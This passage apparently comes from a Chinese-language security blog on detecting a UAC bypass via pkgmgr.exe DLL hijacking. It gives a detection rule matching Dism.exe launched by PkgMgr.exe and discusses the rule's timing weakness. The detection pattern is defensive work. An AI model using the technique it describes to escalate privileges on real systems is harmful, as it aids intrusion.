      [any where winlog.event_id==1 and winlog.event_data.Image regex ".*Dism\\.exe" and  winlog.event_data.ParentImage regex ".*PkgMgr\\.exe"]  
```



测试效果如下，可以看到我们是能够匹配到这个提权行为的，但是这个规则也有一个比较大的”隐患“，因为越权写文件和利用pkgmgr.exe提权，这个两个动作，其实时间上是没有强关联的，只能说写文件一定在pkgmgr.exe之前，但是之前多久就不知道了；但是毋庸置疑的是，如果规定的越权写文件的动作存在，那么一定是攻击者的行为，并且后续肯定会在某个时间点调用pkgmgr.exe提权；

![image-20240719190905160](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240719190905160.png)

